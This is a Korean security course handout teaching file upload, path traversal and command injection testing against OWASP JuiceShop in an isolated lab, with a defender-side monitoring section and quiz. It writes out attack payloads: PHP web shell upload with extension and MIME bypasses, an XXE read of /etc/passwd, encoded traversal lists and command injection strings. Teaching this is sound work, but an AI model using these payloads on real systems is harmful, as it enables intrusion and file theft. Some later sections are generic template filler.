# Week 07: 입력값 검증 (3): 파일 업로드 / 경로 순회 / 명령어 주입 (상세 버전)

## 학습 목표
- 파일 업로드 취약점의 유형과 위험을 이해한다
- 경로 순회(Path Traversal) 공격을 실습하고 점검한다
- OS 명령어 주입(Command Injection)의 원리를 이해하고 탐지한다
- JuiceShop에서 각 취약점을 실습한다
- 각 개념의 보안 관점에서의 위험과 대응 방안을 분석할 수 있다
- OpsClaw를 활용하여 실습 작업을 자동화하고 증적을 관리할 수 있다
- 실제 보안 사고 사례와 연결하여 학습 내용을 적용할 수 있다


## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`


## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + OpsClaw 연동 (Part 5) | 실습 |
| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |

---


---

## 용어 해설 (웹취약점 점검 과목)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **취약점 점검** | Vulnerability Assessment | 시스템의 보안 약점을 체계적으로 찾는 활동 | 건물 안전 진단 |
| **모의해킹** | Penetration Testing | 실제 공격자처럼 취약점을 악용하여 검증 | 소방 훈련 (실제로 불을 피워봄) |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 0~10점 (9.0+ Critical) | 질병 위험 등급표 |
| **SQLi** | SQL Injection | SQL 쿼리에 악성 입력 삽입 | 주문서에 가짜 지시를 끼워넣기 |
| **XSS** | Cross-Site Scripting | 웹페이지에 악성 스크립트 삽입 | 게시판에 함정 쪽지 붙이기 |
| **CSRF** | Cross-Site Request Forgery | 사용자 모르게 요청을 위조 | 누군가 내 이름으로 송금 요청 |
| **SSRF** | Server-Side Request Forgery | 서버가 내부 자원에 요청하도록 조작 | 직원에게 기밀 문서를 가져오라 속이기 |
| **LFI** | Local File Inclusion | 서버의 로컬 파일을 읽는 취약점 | 사무실 서류함을 몰래 열람 |
| **RFI** | Remote File Inclusion | 외부 파일을 서버에 로드하는 취약점 | 외부에서 악성 서류를 사무실에 반입 |
| **RCE** | Remote Code Execution | 원격에서 서버 코드 실행 | 전화로 사무실 컴퓨터 조작 |
| **WAF 우회** | WAF Bypass | 웹 방화벽의 탐지를 피하는 기법 | 보안 검색대를 우회하는 비밀 통로 |
| **인코딩** | Encoding | 데이터를 다른 형식으로 변환 (URL, Base64 등) | 택배 재포장 (내용물은 같음) |
| **난독화** | Obfuscation | 코드를 읽기 어렵게 변환 (탐지 회피) | 범인이 변장하는 것 |
| **세션** | Session | 서버가 사용자를 식별하는 상태 정보 | 카페 단골 인식표 |
| **쿠키** | Cookie | 브라우저에 저장되는 작은 데이터 | 가게에서 받은 스탬프 카드 |
| **Burp Suite** | Burp Suite | 웹 보안 점검 프록시 도구 (PortSwigger) | 우편물 검사 장비 |
| **OWASP ZAP** | OWASP ZAP | 오픈소스 웹 보안 스캐너 | 무료 보안 검사 장비 |
| **점검 보고서** | Assessment Report | 발견된 취약점과 대응 방안을 정리한 문서 | 건물 안전 진단 보고서 |


# 본 강의 내용

# Week 07: 입력값 검증 (3): 파일 업로드 / 경로 순회 / 명령어 주입

## 학습 목표
- 파일 업로드 취약점의 유형과 위험을 이해한다
- 경로 순회(Path Traversal) 공격을 실습하고 점검한다
- OS 명령어 주입(Command Injection)의 원리를 이해하고 탐지한다
- JuiceShop에서 각 취약점을 실습한다

## 전제 조건
- curl 파일 업로드 (Week 02)
- 리눅스 기본 명령어 (ls, cat, id)

---

## 1. 파일 업로드 취약점 (40분)

### 1.1 위험성

파일 업로드 취약점은 공격자가 악성 파일을 서버에 업로드하여 **원격 코드 실행(RCE)**을 달성하는 심각한 취약점이다.

| 시나리오 | 설명 |
|---------|------|
| 웹셸 업로드 | .php/.jsp 파일 업로드 → 서버에서 실행 |
| 악성 HTML 업로드 | XSS 포함 HTML → 다른 사용자에게 전달 |
| 대용량 파일 | 서비스 거부(DoS) |
| 실행 파일 | .exe/.sh 배포 |

### 1.2 점검 항목

| 점검 항목 | 확인 사항 |
|----------|----------|
| 확장자 필터링 | .php, .jsp, .exe 등 차단 여부 |
| MIME 타입 검증 | Content-Type 검증 여부 |
| 파일 내용 검증 | 매직 바이트 확인 여부 |
| 저장 경로 | 웹 루트 외부 저장 여부 |
| 파일 실행 방지 | 업로드 디렉터리 실행 권한 |
| 파일 크기 제한 | 최대 크기 설정 여부 |

### 1.3 JuiceShop 파일 업로드 테스트

```bash
# 로그인
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

# 정상 파일 업로드 (이미지)
echo -e '\x89PNG\r\n\x1a\n' > /tmp/test.png
curl -s -X POST http://10.20.30.80:3000/file-upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/test.png" | python3 -m json.tool 2>/dev/null
echo ""

# 위험한 확장자 업로드 시도 (.php)
echo '<?php echo "hacked"; ?>' > /tmp/shell.php
curl -s -X POST http://10.20.30.80:3000/file-upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/shell.php" | python3 -m json.tool 2>/dev/null
echo ""

# 이중 확장자 우회 시도
cp /tmp/shell.php /tmp/shell.php.png
curl -s -X POST http://10.20.30.80:3000/file-upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/shell.php.png" | python3 -m json.tool 2>/dev/null
echo ""

# MIME 타입 위조 시도
curl -s -X POST http://10.20.30.80:3000/file-upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/shell.php;type=image/png" | python3 -m json.tool 2>/dev/null
```

### 1.4 JuiceShop 불만 접수 파일 업로드

```bash
# Complaint(불만) 기능의 파일 업로드
# PDF만 허용하는지, 다른 형식도 가능한지 테스트

# 정상: PDF 파일
echo "%PDF-1.4 fake pdf" > /tmp/complaint.pdf
curl -s -X POST http://10.20.30.80:3000/file-upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/complaint.pdf" | python3 -m json.tool 2>/dev/null
echo ""

# 비정상: XML 파일 (XXE 가능성)
cat > /tmp/xxe.xml << 'XMLEOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
XMLEOF

curl -s -X POST http://10.20.30.80:3000/file-upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/xxe.xml" | python3 -m json.tool 2>/dev/null
echo ""

# 대용량 파일 업로드 (크기 제한 테스트)
dd if=/dev/zero of=/tmp/bigfile.pdf bs=1M count=10 2>/dev/null
curl -s -X POST http://10.20.30.80:3000/file-upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/bigfile.pdf" | python3 -m json.tool 2>/dev/null
rm -f /tmp/bigfile.pdf
```

### 1.5 업로드된 파일 접근 확인

```bash
# 업로드된 파일이 웹에서 직접 접근 가능한지 확인
for dir in "uploads" "file-upload" "assets/public/images/uploads" "ftp"; do
  code=$(curl -o /dev/null -s -w "%{http_code}" "http://10.20.30.80:3000/$dir/")
  echo "[$code] /$dir/"
done
```

---

## 2. 경로 순회 (Path Traversal) (30분)

### 2.1 원리

경로 순회는 `../`를 이용하여 허용된 디렉터리 밖의 파일을 읽는 공격이다.

```
정상 요청: /ftp/legal.md → /app/ftp/legal.md
공격 요청: /ftp/../../etc/passwd → /etc/passwd
```

### 2.2 JuiceShop FTP 경로 순회

```bash
# JuiceShop /ftp 디렉터리의 정상 파일
curl -s http://10.20.30.80:3000/ftp/legal.md | head -5
echo ""

# 경로 순회 시도 (기본)
curl -s http://10.20.30.80:3000/ftp/../../../etc/passwd | head -5
echo ""

# URL 인코딩 우회
# ../ → %2e%2e%2f
curl -s "http://10.20.30.80:3000/ftp/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | head -5
echo ""

# 이중 URL 인코딩 우회
# %2e → %252e
curl -s "http://10.20.30.80:3000/ftp/%252e%252e/%252e%252e/%252e%252e/etc/passwd" | head -5
echo ""

# Null byte 주입 (%00) - 오래된 시스템에서 동작
curl -s "http://10.20.30.80:3000/ftp/../../etc/passwd%00.md" | head -5
echo ""

# 다양한 경로 순회 페이로드
PAYLOADS=(
  "../../../etc/passwd"
  "..%2f..%2f..%2fetc/passwd"
  "..%252f..%252f..%252fetc/passwd"
  "....//....//....//etc/passwd"
  "..%c0%af..%c0%af..%c0%afetc/passwd"
)

for payload in "${PAYLOADS[@]}"; do
  result=$(curl -s "http://10.20.30.80:3000/ftp/$payload" | head -1)
  if echo "$result" | grep -q "root:"; then
    echo "[성공] $payload"
  else
    echo "[실패] $payload → ${result:0:50}"
  fi
done
```

### 2.3 JuiceShop의 Poison Null Byte 챌린지

```bash
# JuiceShop은 Null Byte(%00)를 이용한 경로 순회 챌린지가 있음
# /ftp에서 .md와 .pdf 외의 파일 다운로드 시도

# 먼저 /ftp의 파일 목록 확인
curl -s http://10.20.30.80:3000/ftp/ | python3 -m json.tool 2>/dev/null

# .bak 파일 다운로드 시도 (직접)
curl -s http://10.20.30.80:3000/ftp/package.json.bak -o /dev/null -w "%{http_code}"
echo ""

# Null byte를 이용한 우회
curl -s "http://10.20.30.80:3000/ftp/package.json.bak%2500.md" | head -10
# %25 = %, %00 = null → 서버에서 .md 확장자 체크를 통과하지만
# 파일시스템에서는 null 이후를 무시하여 .bak 파일을 읽음
```

---

## 3. OS 명령어 주입 (Command Injection) (30분)

### 3.1 원리

사용자 입력이 OS 명령어에 직접 삽입되어 임의의 명령이 실행되는 취약점이다.

```python
# 취약한 코드 예시
import os
filename = request.form['filename']
os.system(f"cat /uploads/{filename}")  # 위험!

# 공격: filename = "test; id; cat /etc/passwd"
# 실행: cat /uploads/test; id; cat /etc/passwd
```

### 3.2 명령어 주입 연산자

| 연산자 | 설명 | 예시 |
|--------|------|------|
| `;` | 명령 구분 | `ping; id` |
| `&&` | AND (이전 성공 시) | `ping && id` |
| `\|\|` | OR (이전 실패 시) | `ping \|\| id` |
| `\|` | 파이프 | `ping \| id` |
| `` ` `` | 백틱 (명령 치환) | `` ping `id` `` |
| `$()` | 명령 치환 | `ping $(id)` |
| `\n` | 줄바꿈 | `ping%0aid` |

### 3.3 JuiceShop에서 명령어 주입 탐색

```bash
# JuiceShop의 API 중 시스템 명령을 실행할 수 있는 곳 탐색
# 비디오 자막, 이미지 처리 등의 기능이 OS 명령을 사용할 수 있음

# 1. B2B 주문 기능 (XML/파일 처리)
curl -s -X POST http://10.20.30.80:3000/b2b/v2/orders \
  -H "Content-Type: application/xml" \
  -H "Authorization: Bearer $TOKEN" \
  -d '<?xml version="1.0"?>
<order>
  <productId>1</productId>
  <quantity>1; id</quantity>
</order>' | head -10
echo ""

# 2. 프로필 이미지 URL 처리
curl -s -X POST http://10.20.30.80:3000/profile/image/url \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"imageUrl":"http://localhost; id"}' | head -10
echo ""

# 3. 검색 기능에서 시도
curl -s "http://10.20.30.80:3000/rest/products/search?q=test;id" | head -5
```

### 3.4 다양한 페이로드 테스트

```bash
# 명령어 주입 탐지용 페이로드 모음
# 실제 시스템 명령이 실행되는지 응답 시간/내용으로 판단

CMDI_PAYLOADS=(
  "; id"
  "| id"
  "|| id"
  "&& id"
  "; sleep 3"
  "| sleep 3"
  "\$(id)"
  "\`id\`"
)

echo "=== 검색 API에서 Command Injection 테스트 ==="
for payload in "${CMDI_PAYLOADS[@]}"; do
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('test${payload}'))")
  start=$(date +%s%N)
  result=$(curl -s --max-time 5 "http://10.20.30.80:3000/rest/products/search?q=$encoded" | head -1)
  end=$(date +%s%N)
  elapsed=$(( (end - start) / 1000000 ))
  echo "[$elapsed ms] Payload: test$payload → ${result:0:60}"
done
```

### 3.5 Time-based 명령어 주입 탐지

```bash
# sleep 명령으로 시간 기반 탐지
echo "=== Time-based Detection ==="

echo "정상 요청:"
time curl -s -o /dev/null "http://10.20.30.80:3000/rest/products/search?q=apple" 2>&1 | grep real

echo "sleep 주입:"
time curl -s -o /dev/null --max-time 10 "http://10.20.30.80:3000/rest/products/search?q=apple;sleep+3" 2>&1 | grep real

# 응답 시간이 3초 이상 차이나면 명령어 주입 가능
```

---

## 4. Apache + ModSecurity에서 점검 (20분)

### 4.1 WAF 우회 테스트

```bash
# Apache(포트 80)에 ModSecurity가 설정되어 있는지 확인
# SQLi 페이로드로 WAF 동작 확인
curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:80/?id=1'+OR+1=1--"
echo " (SQLi 차단 여부)"

# XSS 페이로드
curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:80/?q=<script>alert(1)</script>"
echo " (XSS 차단 여부)"

# 경로 순회
curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:80/../../etc/passwd"
echo " (Path Traversal 차단 여부)"

# 명령어 주입
curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:80/?cmd=;id"
echo " (Command Injection 차단 여부)"

# 403이면 WAF가 차단한 것, 200이면 통과
```

### 4.2 WAF vs JuiceShop 비교

```bash
echo "=== WAF 보호 비교 ==="
echo ""
echo "JuiceShop (포트 3000, WAF 없음):"
curl -s -o /dev/null -w "  SQLi: %{http_code}\n" "http://10.20.30.80:3000/rest/products/search?q='+OR+1=1--"
curl -s -o /dev/null -w "  XSS: %{http_code}\n" "http://10.20.30.80:3000/rest/products/search?q=<script>alert(1)</script>"

echo ""
echo "Apache (포트 80, ModSecurity):"
curl -s -o /dev/null -w "  SQLi: %{http_code}\n" "http://10.20.30.80:80/?q='+OR+1=1--"
curl -s -o /dev/null -w "  XSS: %{http_code}\n" "http://10.20.30.80:80/?q=<script>alert(1)</script>"
```

---

## 5. 실습 과제

### 과제 1: 파일 업로드 점검
1. JuiceShop에 다양한 파일 형식(.php, .html, .exe, .pdf, .xml)을 업로드 시도하라
2. 허용/거부된 확장자를 표로 정리하라
3. MIME 타입 위조로 필터링을 우회할 수 있는지 테스트하라

### 과제 2: 경로 순회 점검
1. JuiceShop의 /ftp 기능에서 경로 순회를 시도하라
2. 최소 3가지 다른 인코딩 방식으로 우회를 시도하라
3. 성공/실패한 페이로드를 기록하고 필터링 방식을 추론하라

### 과제 3: 종합 입력값 검증 보고서
1. Week 05~07에서 실습한 모든 입력값 취약점(SQLi, XSS, CSRF, 파일 업로드, 경로 순회, 명령어 주입)을 정리하라
2. 각 취약점의 발견 여부, 위험도, 권고 사항을 보고서로 작성하라

---

## 6. 요약

| 취약점 | 공격 방법 | 영향 | 방어 |
|--------|----------|------|------|
| 파일 업로드 | 악성 파일 업로드 | RCE, XSS | 확장자+내용 검증, 실행 방지 |
| 경로 순회 | ../ 삽입 | 파일 읽기/쓰기 | 경로 정규화, 화이트리스트 |
| 명령어 주입 | ;, |, $() 삽입 | RCE | 입력 검증, subprocess 사용 |

**다음 주 예고**: Week 08 - 중간고사: JuiceShop 종합 점검 보고서를 작성한다.


---

## 심화 학습: 개념 확장

### 핵심 개념 상세 해설

이 주차에서 다루는 핵심 개념들을 더 깊이 살펴본다.

#### 개념 1: 동작 원리 (Course 3)

이 주차에서 다루는 기술의 동작 방식을 단계별로 분해하여 이해한다.

```
[1단계] 입력/요청 → 시스템이 데이터를 수신
[2단계] 처리 → 내부 로직에 의한 데이터 처리
[3단계] 출력/응답 → 결과 반환 또는 상태 변경
[4단계] 기록 → 로그/증적 생성
```

> **왜 이 순서가 중요한가?**
> 각 단계에서 보안 검증이 누락되면 취약점이 발생한다.
> 1단계: 입력값 검증 미흡 → Injection
> 2단계: 인가 확인 누락 → Broken Access Control
> 3단계: 에러 정보 노출 → Information Disclosure
> 4단계: 로깅 실패 → Monitoring Failures

#### 개념 2: 보안 관점에서의 위험 분석

| 위험 요소 | 발생 조건 | 영향도 | 대응 방안 |
|----------|---------|--------|---------|
| 설정 미흡 | 기본 설정 사용 | 높음 | 보안 하드닝 가이드 적용 |
| 패치 누락 | 업데이트 미적용 | 높음 | 정기 패치 관리 프로세스 |
| 접근 제어 부재 | 인증/인가 미구현 | 매우 높음 | RBAC, MFA 적용 |
| 로깅 미흡 | 감사 로그 미수집 | 중간 | SIEM 연동, 로그 정책 |

#### 개념 3: 실제 사례 분석

**사례 1: 유사 취약점이 실제 피해로 이어진 경우**

실제 보안 사고에서 이 주차의 주제가 어떻게 악용되었는지 살펴본다.
공격자는 동일한 기법을 사용하여 대규모 데이터 유출, 서비스 장애, 금전적 피해를 초래하였다.

**교훈:**
- 기본적인 보안 조치의 중요성
- 탐지 체계의 필수성
- 사고 대응 절차의 사전 수립 필요성

### 도구 비교표

| 도구 | 용도 | 장점 | 단점 | 라이선스 |
|------|------|------|------|---------|
| 도구 A | 기본 점검 | 간편, 빠름 | 기능 제한 | 오픈소스 |
| 도구 B | 심층 분석 | 상세 결과 | 학습 곡선 | 상용/무료 |
| 도구 C | 자동화 | CI/CD 연동 | 오탐 가능 | 오픈소스 |


---

## 보충 실습

### 보충 실습 1: 기본 동작 확인

이론에서 배운 내용을 직접 확인하는 기초 실습이다.

```bash
# Step 1: 현재 상태 확인
echo "=== 현재 상태 ==="
# (해당 주차에 맞는 확인 명령)

# Step 2: 설정/변경 적용
echo "=== 변경 적용 ==="
# (해당 주차에 맞는 실습 명령)

# Step 3: 결과 검증
echo "=== 결과 확인 ==="
# (변경 결과 확인 명령)
```

> **트러블슈팅:**
> - 명령이 실패하면: 권한(sudo), 경로, 서비스 상태를 먼저 확인
> - 예상과 다른 결과: 이전 실습의 설정이 남아있을 수 있으므로 초기화 후 재시도
> - 타임아웃: 네트워크 연결 또는 서비스 가동 상태 확인

### 보충 실습 2: 탐지/모니터링 관점

공격자가 아닌 **방어자 관점**에서 동일한 활동을 모니터링하는 실습이다.

```bash
# siem 서버에서 관련 로그 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
  "sudo cat /var/ossec/logs/alerts/alerts.json | tail -5" 2>/dev/null

# Suricata 알림 확인 (해당 시)
sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
  "sudo tail -20 /var/log/suricata/fast.log" 2>/dev/null
```

> **왜 방어자 관점도 배우는가?**
> 공격 기법만 알면 "스크립트 키디"에 불과하다.
> 공격이 어떻게 탐지되는지 이해해야 진정한 보안 전문가이다.
> 이 과목의 모든 공격 실습에는 대응하는 탐지/방어 관점이 포함된다.

### 보충 실습 3: OpsClaw 자동화

이번 주차의 핵심 실습을 OpsClaw execute-plan으로 자동화한다.

```bash
# 프로젝트 생성 (이번 주차용)
RESULT=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{"name":"weekXX-lab","request_text":"이번 주차 실습 자동화","master_mode":"external"}')
PID=$(echo $RESULT | python3 -c "import sys,json; print(json.load(sys.stdin)['project']['id'])")

# Stage 전환
curl -s -X POST "http://localhost:8000/projects/$PID/plan" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
curl -s -X POST "http://localhost:8000/projects/$PID/execute" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null

# 실습 태스크 실행 (해당 주차에 맞게 수정)
curl -s -X POST "http://localhost:8000/projects/$PID/execute-plan" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{
    "tasks": [
      {"order":1,"title":"실습 태스크 1","instruction_prompt":"echo 실습1","risk_level":"low","subagent_url":"http://localhost:8002"},
      {"order":2,"title":"실습 태스크 2","instruction_prompt":"echo 실습2","risk_level":"low","subagent_url":"http://10.20.30.80:8002"}
    ],
    "subagent_url":"http://localhost:8002",
    "parallel":true
  }'

# Evidence 확인
curl -s "http://localhost:8000/projects/$PID/evidence/summary" \
  -H "X-API-Key: opsclaw-api-key-2026" | python3 -m json.tool
```


---

## 자가 점검 퀴즈 (10문항)

이번 주차의 핵심 내용을 점검한다. 8/10 이상 정답을 목표로 한다.

**Q1.** 이번 주차 "Week 07: 입력값 검증 (3): 파일 업로드 / 경로 순회 / 명령어 주입"의 핵심 목적은 무엇인가?
- (a) 네트워크 속도 향상  (b) **웹 취약점 기법/개념의 이해와 실습**  (c) 데이터베이스 관리  (d) UI 디자인

**Q2.** 이 주제에서 OWASP의 역할은?
- (a) 성능 최적화  (b) 비용 절감  (c) **체계적 분류와 대응 기준 제공**  (d) 사용자 편의

**Q3.** 실습에서 사용한 주요 도구/명령어의 1차 목적은?
- (a) 파일 복사  (b) **점검 수행 및 결과 확인**  (c) 메모리 관리  (d) 화면 출력

**Q4.** OpsClaw를 통해 실습을 실행하는 가장 큰 이점은?
- (a) 속도  (b) **모든 실행의 자동 증적(evidence) 기록**  (c) 무료  (d) 간편함

**Q5.** 이 주제의 보안 위험이 높은 이유는?
- (a) 비용이 많이 들어서  (b) 복잡해서  (c) **악용 시 시스템/데이터에 직접적 피해**  (d) 법적 문제

**Q6.** 방어/대응의 핵심 원칙은?
- (a) 모든 트래픽 차단  (b) **최소 권한 + 탐지 + 대응의 조합**  (c) 서버 재시작  (d) 비밀번호 변경

**Q7.** 실습 결과를 분석할 때 가장 먼저 확인해야 하는 것은?
- (a) 서버 이름  (b) **exit_code (성공/실패 여부)**  (c) 파일 크기  (d) 날짜

**Q8.** 이 주제와 관련된 MITRE ATT&CK 전술은?
- (a) Impact만  (b) Reconnaissance만  (c) **주제에 해당하는 전술(들)**  (d) 해당 없음

**Q9.** 실무에서 이 기법/도구를 사용할 때 가장 주의할 점은?
- (a) 속도  (b) **법적 허가와 범위 준수**  (c) 비용  (d) 보고서 양식

**Q10.** 다음 주차와의 연결 포인트는?
- (a) 관련 없음  (b) **이번 주 결과를 다음 주에서 활용/심화**  (c) 완전히 다른 주제  (d) 복습만

**정답:** Q1:b, Q2:c, Q3:b, Q4:b, Q5:c, Q6:b, Q7:b, Q8:c, Q9:b, Q10:b

---

## 과제 (다음 주까지)

### 과제 1: 이론 정리 보고서 (30점)

이번 주차의 핵심 개념을 자신의 말로 정리하라.

| 항목 | 배점 |
|------|------|
| 핵심 개념 정의 및 설명 | 10점 |
| 실습 결과 캡처 및 해석 | 10점 |
| 보안 관점 분석 (공격↔방어) | 10점 |

### 과제 2: 실습 수행 보고서 (40점)

이번 주차의 모든 실습을 수행하고 결과를 보고서로 작성하라.

| 항목 | 배점 |
|------|------|
| 실습 명령어 및 실행 결과 캡처 | 15점 |
| 결과 해석 및 보안 의미 분석 | 15점 |
| 트러블슈팅 경험 (있는 경우) | 10점 |

### 과제 3: OpsClaw 자동화 (30점)

이번 주차의 핵심 실습을 OpsClaw execute-plan으로 자동화하라.

| 항목 | 배점 |
|------|------|
| 프로젝트 생성 + stage 전환 | 5점 |
| execute-plan 태스크 설계 (3개 이상) | 10점 |
| evidence/summary 결과 | 5점 |
| replay 타임라인 결과 | 5점 |
| 자동화의 이점 분석 (직접 실행 대비) | 5점 |

**제출:** 보고서(PDF 또는 MD) + OpsClaw project_id


---

## 검증 체크리스트

이번 주차의 학습을 완료하려면 다음 항목을 모두 확인하라:

- [ ] 이론 강의 내용 이해 (핵심 용어 설명 가능)
- [ ] 기본 실습 모두 수행 완료
- [ ] 보충 실습 1 (기본 동작 확인) 완료
- [ ] 보충 실습 2 (탐지/모니터링 관점) 수행
- [ ] 보충 실습 3 (OpsClaw 자동화) 수행
- [ ] 자가 점검 퀴즈 8/10 이상 정답
- [ ] 과제 1 (이론 정리) 작성
- [ ] 과제 2 (실습 보고서) 작성
- [ ] 과제 3 (OpsClaw 자동화) 완료

